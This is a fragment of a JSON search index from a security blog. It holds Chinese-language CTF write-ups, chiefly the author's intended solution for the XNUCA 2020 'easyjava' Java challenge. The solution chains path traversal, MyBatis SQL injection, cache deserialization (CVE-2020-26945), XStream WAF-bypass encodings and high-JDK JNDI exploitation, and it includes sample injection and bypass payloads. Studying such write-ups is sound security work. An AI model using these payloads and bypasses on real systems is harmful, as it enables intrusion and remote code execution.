</ol>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_3","title":"\u603b\u7ed3","text":"<p>\u8bb0\u5f55\u4e00\u4e0bgetshell\u7684\u5751\u70b9   1. eval\u4e0d\u662f\u51fd\u6570\uff0c\u662f\u8bed\u53e5   2. \u4e0d\u7528\u5f15\u53f7\uff0c\u7528\u4e2d\u6587\u4e5f\u88abphp\u5f53\u4f5c\u662f\u5b57\u7b26\u4e32   3. UTF-8\u7f16\u7801 http://www.herongyang.com/gb2312_gb/pinyin_32.html</p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/","title":"xnuca2020 easyjava\u8bbe\u8ba1\u601d\u8def","text":"","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#0x00","title":"0x00 \u524d\u8a00","text":"<p>easyjava\u7684\u8bbe\u8ba1\u601d\u8def\u4e3b\u8981\u6765\u6e90\u4e8e\u73b0\u5b9e\u73af\u5883\u4e2d\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u4ee5\u53ca\u6700\u8fd1\u521a\u51fa\u7684mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u7684\u5b89\u5168\u95ee\u9898\u7684\u4e00\u79cd\u8bbe\u60f3\u3002\u9898\u76ee\u7684\u8bbe\u8ba1\u76ee\u7684\u4e3b\u8981\u8003\u5bdf\u9009\u624b\u5bf9\u4e8e\u5b9e\u64cd\u6027\u7684\u6f0f\u6d1e\u7684\u5229\u7528\u4ee5\u53ca\u6e90\u7801\u5ba1\u8ba1\u80fd\u529b\u3002</p> <p>\u5177\u4f53\u7684\u8003\u70b9\u5982\u4e0b\uff1a</p> <ol> <li>\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\uff0c/proc/self/fd\u7684\u5229\u7528</li> <li>mybatis\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0cCVE-2020-26945</li> <li>xstream\u53cd\u5e8f\u5217\u5316\u5229\u7528\uff0c\u7b80\u5355\u6b63\u5219waf\u7ed5\u8fc7\uff0c\u7c7b\u6bd4fastjson unicode\u7f16\u7801\u7ed5\u8fc7</li> <li>\u9ad8\u7248\u672cjava\u7248\u672c\u4e0b\u7684jndi\u5229\u7528</li> </ol>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#0x01","title":"0x01 \u9884\u671f\u9898\u89e3","text":"<p>\u9898\u76ee\u672c\u8eab\u8bbe\u8ba1\u7684\u529f\u80fd\u70b9\u6bd4\u8f83\u5c11\uff0c\u4e3b\u8981\u662fjpg\u56fe\u7247\u7b7e\u540d\uff0c\u4e0b\u8f7d\u548c\u9a8c\u7b7e\u529f\u80fd</p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#1","title":"#1 \u6e90\u7801\u83b7\u53d6","text":"<p>\u8fd9\u91cc\u9996\u5148\u5173\u6ce8\u4e0b\u8f7d\u7684\u63a5\u53e3 </p> <p>\u5728\u8fd4\u56de\u5305\u91cc\u5b58\u5728Check\u5b57\u6bb5\uff0c\u4e8eget\u8bf7\u6c42\u4e2d\u7684sign\u5b57\u6bb5\u662f\u4e00\u6837\u7684\u5185\u5bb9\uff0c\u5c1d\u8bd5\u4fee\u6539filename\u4e3a<code>../../../../../../etc/passwd</code></p> <p></p> <p></p> <p>check\u5b57\u6bb5\u8fd4\u56de\u4e86\u4e0d\u4e00\u6837\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5224\u65ad\u53ef\u80fdsign\u503c\u7528\u4e8e\u6821\u9a8c\uff0c\u901a\u8fc7\u624d\u8fd4\u56de\u7ed3\u679c\uff0c\u90a3\u4e48\u4fee\u6539sign\u5b57\u6bb5\uff0c\u5373\u53ef\u83b7\u53d6\u5230\u5f53\u524d\u8bf7\u6c42\u7684\u5185\u5bb9\u3002\u63a5\u4e0b\u6765\uff0c\u7531\u4e8e\u662flinux\u7cfb\u7edf\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u66b4\u529bfd\u503c\u6765\u83b7\u53d6\u5230\u5f53\u524d\u8fd0\u884c\u7684jar\u5305\u5185\u5bb9\uff0c\u5982<code>/proc/self/fd/4</code>\u6765\u83b7\u53d6jar\u5305</p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#2-mybatis-sql","title":"#2 mybatis SQL\u6ce8\u5165","text":"<p>\u62ff\u5230jar\u53cd\u7f16\u8bd1\u540e\u5148\u770bpom\uff0c\u5176\u4e2d\u6bd4\u8f83\u5bb9\u6613\u5173\u6ce8\u7684\u4e3b\u8981\u662f\u4e24\u4e2ajar\u5305\uff0c\u4e00\u4e2a\u662fmybatis\u7684springboot\u5305\uff0c\u53e6\u4e00\u4e2a\u662fxstream\u7684\u5305</p> <p></p> <p>\u5982\u679c\u5173\u6ce8cve\u52a8\u6001\u7684\u8bdd\uff0c\u53ef\u4ee5\u77e5\u9053\u6700\u8fd1\u521a\u51fa\u7684\u6f0f\u6d1eCVE-2020-26945\uff0c\u867d\u7136mybatis\u7684\u7248\u672c\u5df2\u7ecf\u8fdb\u884c\u4e86\u5347\u7ea7\uff0c\u4f46spring\u7684mybatis\u5305\u4e2d\u7684mybatis\u4f9d\u8d56\u5e76\u6ca1\u6709\u5347\u7ea7\uff0c\u4ecd\u7136\u662f3.5.5\u7248\u672c\uff0c\u518d\u786e\u5b9a\u4e00\u4e0b\uff0c\u662f\u5426\u542f\u7528\u4e86cache</p> <p></p> <p>\u4ecemapper\u5bf9\u5e94\u7684xml\u914d\u7f6e\u91cc\u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86cache\u914d\u7f6e\uff0c\u5e76\u4e14<code>findByHashAndSecret</code>\u63a5\u53e3\u5b58\u5728\u6ce8\u5165\u3002</p> <p>\u5230\u8fd9\u91cc\u5c31\u7b80\u5355\u4e86\uff0c\u6211\u4eec\u53ea\u8981\u627e\u4e00\u4e0b\uff0c\u8c03\u7528\u70b9\u786e\u8ba4\u662f\u5426\u53ef\u63a7\uff0c\u5373\u53ef\u786e\u8ba4\u662f\u5426\u5b58\u5728\u6ce8\u5165</p> <p><code>nese.game.controller.CheckController</code>\u5b58\u5728\u94fe\u8def\uff0c\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u5185\u5bb9\uff0c\u5e76\u8fdb\u884c\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u6240\u4ee5\u8fd9\u8fb9\u6211\u4eec\u80fd\u8fbe\u5230\u4e00\u4e2a\u6ce8\u5165\u7684\u6548\u679c</p> <p></p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#3-mybatis","title":"#3 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>\u63a5\u4e0b\u6765\uff0c\u7ee7\u7eed\u8fdb\u884c\u5ba1\u8ba1\uff0c\u5173\u6ce8\u4e00\u4e0b\u53e6\u4e00\u4e2a\u70b9xstream\u5305\u7684\u5b89\u5168\u95ee\u9898\u3002\u5728<code>nese.game.entity.Picture</code>\u5bf9\u8c61\u4e0a\uff0c\u8c03\u7528\u4e86xstream\u7684fromXML\u51fd\u6570\uff0c\u5e76\u4e14\u5728<code>readObject</code>\u51fd\u6570\u5904\u5bf9\u5b57\u7b26\u4e32\u7c7b\u578b\u7684xml\u8fdb\u884c\u8fd8\u539f</p> <p></p> <p>\u5230\u8fd9\u91cc\u5c31\u6bd4\u8f83\u6e05\u6670\u4e86\uff0c\u6211\u4eec\u9700\u8981\u5229\u7528\u524d\u9762\u53d1\u73b0\u7684SQL\u6ce8\u5165\u70b9\uff0c\u8fdb\u884c\u6ce8\u5165\u6784\u9020\u4efb\u610f\u7684xml\u6570\u636e</p> <p>\u5e76\u5229\u7528mybatis\u7684\u9ed8\u8ba4\u4e8c\u7ea7\u7f13\u5b58\u4f7f\u7528serialization\u7684\u539f\u7406\uff08\u5982\u4e0b\u56fe\u5b98\u65b9\u6587\u6863\u6240\u793a\uff09\uff0c\u6765\u89e6\u53d1xstream\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u5c31\u6839\u636e\u9898\u76ee\u7684\u7b7e\u540d\u5b9e\u73b0\uff0c\u6765\u6ce8\u5165\u4efb\u610f\u6570\u636e\uff0c\u4ee5\u5982\u4e0b\u4ee3\u7801\u4e3a\u4f8b\uff0c\u751f\u6210\u5b58\u5728\u6ce8\u5165\u8bed\u53e5\u7684jpg\u6587\u4ef6</p> <pre><code>try{\n    String payload = \"evil xml\";\n    File file = new File(\"xxxx.jpg\");\n    File dest = new File(\"xxxx.jpg\");\n    InputStream inputStream = new FileInputStream(file);\n    byte[] bytes = new byte[(int)file.length()];\n    inputStream.read(bytes);\n    InputStream destInputStream = new FileInputStream(dest);\n    String secret=\"' union select 13,'wh1t3p1g','wh1t3p1g','\"+payload+\"','aed2bebb781ae32d94c5e67185e35149\";\n    String hash = \"aed2bebb781ae32d94c5e67185e35149\";\n    ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);\n}catch (Exception e){\n    e.printStackTrace();\n}\n</code></pre> <p>\u63d0\u4ea4\u540e\u53ef\u4ee5\u770b\u5230\u5177\u4f53\u7684\u6548\u679c\uff0c\u91cd\u590d\u63d0\u4ea4\u4e24\u6b21\uff0c\u5373\u53ef\u89e6\u53d1xml\u7684\u53cd\u5e8f\u5217\u5316</p> <p></p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#4-xstreamwaf","title":"#4 XStream\u6b63\u5219waf\u7ed5\u8fc7","text":"<p>\u4ece\u9898\u76ee\u4e0a\u6765\u770b\uff0cXStream\u7684\u5b9e\u73b0\u9700\u8981\u7ed5\u8fc7\u4e24\u4e2a\u70b9\uff1a</p> <ol> <li>PureJavaReflectionProvider</li> </ol> <p>PureJavaReflectionProvider\u4e0d\u652f\u6301\u4e0d\u5b58\u5728\u65e0\u53c2\u6784\u9020\u51fd\u6570\u7684\u7c7b\u7684\u8fd8\u539f\uff0c\u4ee5\u53ca\u8be5\u7c7b\u5982\u679c\u662f\u53ef\u5e8f\u5217\u5316\u7684\uff0c\u90a3\u4e48\u5b83\u7684readObject\u4e0d\u80fd\u6709\u7c7b\u5c5e\u6027\u4e0a\u7684\u8fd8\u539f\u3002\u8fd9\u662f\u56e0\u4e3aPureJavaReflectionProvider\u5bf9\u4e8e\u53cd\u5e8f\u5217\u5316\u7684\u64cd\u4f5c\uff0c\u5e76\u975e\u662f\u4e00\u4e2a\u9012\u5f52\u7684\u8fc7\u7a0b\uff0c\u6709\u7a7a\u518d\u5199\u8fd9\u4e2a\u5206\u6790\uff1a\uff09</p> <ol> <li>\u6b63\u5219waf</li> </ol> <p>\u9898\u76ee\u5e76\u6ca1\u6709\u9075\u5faaXStream\u5b98\u65b9\u7684\u7c7b\u7981\u7528\u65b9\u6cd5\uff0c\u800c\u662f\u91c7\u7528\u6b63\u5219\u7684\u65b9\u5f0f\u5148\u5bf9\u5f85\u53cd\u5e8f\u5217\u5316\u7684xml\u5b57\u7b26\u4e32\u8fdb\u884c\u68c0\u6d4b\uff0c\u68c0\u6d4b\u901a\u8fc7\u540e\u518d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u5173\u4e8e\u7b2c\u4e00\u4e2a\u70b9\uff0c\u6bd4\u8f83\u5bb9\u6613\u89e3\u51b3\uff0c\u53c2\u8003marshalsec\u5bf9\u4e8espring jndi\u5229\u7528\u94fe\u7684\u5b9e\u73b0\uff0c\u8be5\u94fe\u7b26\u5408\u6211\u8bf4\u7684\u8981\u6c42</p> <p>\u800c\u5bf9\u4e8e\u7b2c\u4e8c\u4e2a\u70b9\uff0c\u8fd9\u91cc\u6ca1\u6709\u7528\u5b98\u65b9\u7684\u65b9\u6cd5\uff0c\u63d0\u793a\u4e86\u6211\u4eec\u9700\u8981\u5bf9\u5b57\u7b26\u4e32\u4e0a\u505a\u4e9b\u64cd\u4f5c\u6765\u7ed5\u8fc7\u6b63\u5219waf\u3002\u6211\u4eec\u53c2\u8003fastjson\u7684<code>@type</code>\u7684unicode\u7f16\u7801\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u518d\u770b\u770b\u662f\u5426\u5bf9\u4e8eXStream\uff0c\u4e5f\u540c\u6837\u5b58\u5728\u8fd9\u79cd\u95ee\u9898\uff1f</p> <p>\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u4ecb\u7ecd\u4e00\u4e0bXStream\u7684\u7f16\u7801\u7ed5\u8fc7\uff1a</p> <ol> <li>\u9488\u5bf9\u6807\u7b7e\u9ed1\u540d\u5355\u7684\u7ed5\u8fc7</li> </ol> <p>\u4ee5spring jndi\u5229\u7528\u94fe\u4e3a\u6848\u4f8b</p> <pre><code>&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n</code></pre> <p>\u5f53\u524d\u9ed1\u540d\u5355\u4e3a<code>org[.]springframework</code>\uff0c\u6b64\u65f6\u7684\u7ed5\u8fc7\u65b9\u6cd5\u53ef\u4ee5\u4e3a</p> <pre><code>&lt;org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n&lt;/org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n</code></pre> <p>\u8fd9\u91cc\u7684\u539f\u7406\u5728\u4e8exstream\u4f1a\u5bf9\u7b26\u5408\u683c\u5f0f\u768416\u8fdb\u5236\u505a\u8f6c\u6362</p> <p><code>com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName</code></p> <p><code>com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName</code></p> <pre><code>for (; i &lt; length; i++ ) {\n  char c = name.charAt(i);\n  if (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) {\n    i += dollarReplacement.length() - 1;\n    result.append('$');\n  } else if (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) {\n    // \u5904\u7406hex\u683c\u5f0f\u7684\u6807\u7b7e\u5185\u5bb9\uff0c\u5176\u6b63\u786e\u683c\u5f0f\u4e3a_.xxxx\n    i += hexPrefix.length();\n    c = (char)Integer.parseInt(name.substring(i, i + 4), 16);\n    i += 3;\n    result.append(c);\n  } else if (c == escapeReplacementFirstChar\n             &amp;&amp; name.startsWith(escapeCharReplacement, i)) {\n    i += escapeCharReplacement.length() - 1;\n    result.append('_');\n  } else {\n    result.append(c);\n  }\n}\n</code></pre> <p>\u4ecedollarReplacement\uff0chexPrefix\uff0cescapeCharReplacement\u4e09\u8005\u6765\u770b\uff0c\u6700\u7ec8\u4e0d\u5f71\u54cd\u6211\u4eec\u7ed5\u8fc7\u7684\u4e3a16\u8fdb\u5236\u7684\u5904\u7406<code>_.xxxx</code>\u8f6c\u6362\u6210\u5b9e\u9645\u7684\u5b57\u7b26\u3002</p> <ol> <li>\u9488\u5bf9\u6807\u7b7e\u5c5e\u6027\u5185\u5bb9\u7684\u7ed5\u8fc7</li> </ol> <p>\u6848\u4f8b</p> <pre><code>&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"custom\"&gt;\n&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n</code></pre> <p>\u6b64\u65f6\u7684\u9ed1\u540d\u5355\u4e3a<code>custom</code>\uff0c\u90a3\u4e48\u7ed5\u8fc7\u65b9\u6cd5\u53ef\u4ee5\u4e3a</p> <pre><code>&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"cust&amp;#111;m\"&gt;\n&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;\n</code></pre> <p>\u539f\u7406\u4e3a\u8bfb\u53d6\u5c5e\u6027\u5185\u5bb9\u65f6\uff0c\u4f1a\u505a\u7b26\u5408\u8981\u6c42\u7684\u8f6c\u5316</p> <p><code>com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue</code></p> <p>\u8be5\u51fd\u6570\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u4e0d\u8d34\u51fa\u6765\u4e86\uff0c\u4ece883\u884c\u5230942\u884c\u5747\u5728\u5904\u7406html\u7f16\u7801\u683c\u5f0f\uff0c\u5e76\u5c06\u5176\u8f6c\u5316\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26</p> <p>\u6240\u4ee5\u8fd9\u91cc<code>&amp;#111;</code>\u5c06\u8f6c\u5316\u4e3a<code>o</code></p> <ol> <li>\u9488\u5bf9\u6807\u7b7e\u5185\u5bb9\u7684\u7ed5\u8fc7</li> </ol> <p>\u6848\u4f8b</p> <pre><code>&lt;test&gt;\nldap://xxxxx\n&lt;/test&gt;\n</code></pre> <p>\u6b64\u65f6\u7684\u9ed1\u540d\u5355\u4e3a<code>ldap://</code>\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u7684\u51e0\u79cd\u65b9\u6cd5\u7ed5\u8fc7</p> <p>a. html\u7f16\u7801</p> <p>\u8fd9\u90e8\u5206\u5728\u63d0\u53d6\u6570\u636e\u65f6\uff0c\u540c\u6837\u5bf9html\u7f16\u7801\u7684\u5185\u5bb9\u505a\u4e86\u8f6c\u5316</p> <pre><code>&lt;test&gt;\n&amp;#108;dap://xxxxx\n&lt;/test&gt;\n</code></pre> <p>\u8fd9\u90e8\u5206\u8ddf\u4e0a\u9762<code>\u6807\u7b7e\u5c5e\u6027\u5185\u5bb9\u7684\u7ed5\u8fc7</code>\u7684\u4e00\u6837\uff0c\u4e0d\u518d\u53d9\u8ff0</p> <p>b. \u6ce8\u91ca\u7684\u65b9\u6cd5</p> <p>\u5728\u5904\u7406\u5b9e\u9645\u7684\u6807\u7b7e\u5185\u5bb9\u65f6\uff0c\u9047\u5230\u6ce8\u89c6\u5185\u5bb9\u5c06\u88ab\u5ffd\u7565\u6389</p> <pre><code>&lt;test&gt;\nld&lt;!-- test --&gt;ap://xxxxx\n&lt;/test&gt;\n</code></pre> <p><code>com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField</code></p> <p><code>com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue</code></p> <pre><code>public String getValue() {\n\n  // ...\n\n  Event event = readEvent();\n  while (true) {\n    if (event.type == TEXT) { // \u5904\u7406\u5b57\u7b26\n      String text = event.value;\n      if (text != null &amp;&amp; text.length() &gt; 0) {\n        if (last == null) {\n          last = text;\n        } else {\n          if (buffer == null) {\n            buffer = new StringBuffer(last);\n          }\n          buffer.append(text);\n        }\n      }\n    } else if (event.type != COMMENT) {// \u975e\u5b57\u7b26 \u4e14 \u4e0d\u662f\u6ce8\u91ca\u65f6 \u8df3\u51fa\n      break;\n    }\n    event = readEvent(); // \u7ee7\u7eed\n  }\n  reset();\n  if (buffer != null) {\n    return buffer.toString();\n  } else {\n    return (last == null) ? \"\" : last;\n  }\n}\n</code></pre> <p>\u4ece\u524d\u9762\u7684\u4ee3\u7801\u4e2d\u6765\u770b\uff0c\u8fd9\u91cc\u4e3b\u8981\u5728\u5bf9\u5b57\u7b26\u8fdb\u884c\u62fc\u63a5\uff0c\u5e76\u4e14\u9047\u5230\u6ce8\u91ca\u65f6\u5c06\u8df3\u8fc7\uff0c\u6240\u4ee5\u5982\u679c\u5728\u5185\u5bb9\u4e2d\u6dfb\u4e0a\u6ce8\u91ca\u4e5f\u80fd\u8fbe\u5230\u7ed5\u8fc7\u7684\u6548\u679c</p> <p>\u7ecf\u8fc7\u4e0a\u9762XStream\u7c7b\u578b\u89e3\u6790\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u7ed5\u8fc7\u6b63\u5219waf\u7684payload\u6765</p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#5-jndi","title":"#5 \u9ad8\u7248\u672cJNDI\u6ce8\u5165\u7684\u5229\u7528","text":"<p>\u5728\u751f\u6210\u5177\u4f53\u7684exp\u540e\uff0c\u53ef\u4ee5\u5bf9\u5916\u53d1\u8d77JNDI\u8fde\u63a5\uff0c\u5230\u8fd9\u4e00\u6b65\uff0c\u6211\u4eec\u9700\u8981\u53bb\u5224\u65ad\u5176\u4e3a\u9ad8\u7248\u672cjdk\u8fd8\u662f\u4f4e\u7248\u672c\u7684jdk\u3002\u5982\u679c\u662f\u4f4e\u7248\u672c\u7684jdk\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5229\u7528codebase\u52a0\u8f7d\u4efb\u610f\u7684class\u6765\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c\uff0c\u800c\u9ad8\u7248\u672c\u7684jdk\u53ea\u80fd\u4f9d\u8d56\u672c\u5730ObjectFactory\u6216\u672c\u5730\u5229\u7528\u94fe\u6765\u8fdb\u884c\u653b\u51fb\uff0c\u53c2\u8003KINGX\u7684\u6587\u7ae0\u3002</p> <p>\u800c\u672c\u9898\u8003\u67e5\u7684\u4e3a\u9ad8\u7248\u672cjdk\u73af\u5883\u4e0b\u7684\u5229\u7528\uff0c\u90a3\u4e48\u5c31\u6709\u4e24\u79cd\u9009\u62e9\uff0c\u4e00\u4e3a\u672c\u5730\u5229\u7528\u94fe\u89e6\u53d1\u547d\u4ee4\u6765\u6267\u884c\uff0c\u4e8c\u4e3a\u672c\u5730ObjectFactory\u8fbe\u6210\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u4ece\u9898\u76ee\u7684\u4f9d\u8d56\u6765\u770b\uff0c\u6211\u4eec\u5e76\u4e0d\u80fd\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684\u672c\u5730\u5229\u7528\u94fe\u6765\u8fbe\u6210\u5229\u7528\uff0c\u90a3\u4e48\u8003\u5bdf\u7684\u5c31\u662f\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u7684\u5229\u7528\u4e86\u3002\u56e0\u4e3a\u9898\u76ee\u7528\u7684\u662fspring boot embedded tomcat\uff0c\u6240\u4ee5\u6211\u4eec\u80fd\u76f4\u63a5\u5229\u7528KINGX\u5e08\u5085\u6587\u7ae0\u4e2d\u63d0\u5230\u7684\u65b9\u6cd5\uff0c\u5177\u4f53\u7684\u5229\u7528\u8fc7\u7a0b\u4e0d\u63d0\u4e86\uff0c\u53ef\u4ee5\u7528\u6211\u7684ysomap\u6765\u8fbe\u6210\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c</p> <p></p>","tags":["ctf"]},{"location":"writeups/2020/xnuca-2020-easyjava/#0x02-exp","title":"0x02 exp","text":"<p>exp.java</p>","tags":["ctf"]}]}